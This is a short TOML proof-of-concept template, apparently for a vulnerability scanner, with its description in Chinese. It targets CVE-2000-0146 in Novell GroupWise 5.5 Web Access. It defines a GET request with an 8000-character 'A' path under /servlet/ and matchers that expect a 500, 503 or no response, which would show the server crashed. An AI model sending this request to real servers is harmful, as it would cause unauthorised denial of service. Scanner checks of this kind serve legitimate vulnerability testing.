[info]
author = "AVE"
description = "通过向 Novell GroupWise 5.5 Enhancement Pack Web Access 组件的 Java Server servlet 发送超长 URI 请求，触发服务器处理异常导致拒绝服务。攻击无需认证，仅需构造特制 URL 即可实施。"
id = "POC-AVE-2000-0131"
name = "Novell GroupWise Web Access Enhancement Pack Java Server 拒绝服务漏洞 PoC"
severity = "medium"
tags = [
    "cve-2000-0146",
    "novell",
    "groupwise",
    "dos",
]
vuln_id = [
    "CVE-2000-0146",
    "AVE-2000-0131",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/servlet/{{repeat('A', 8000)}}"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
status = [
    500,
    503,
    0,
]
type = "status"
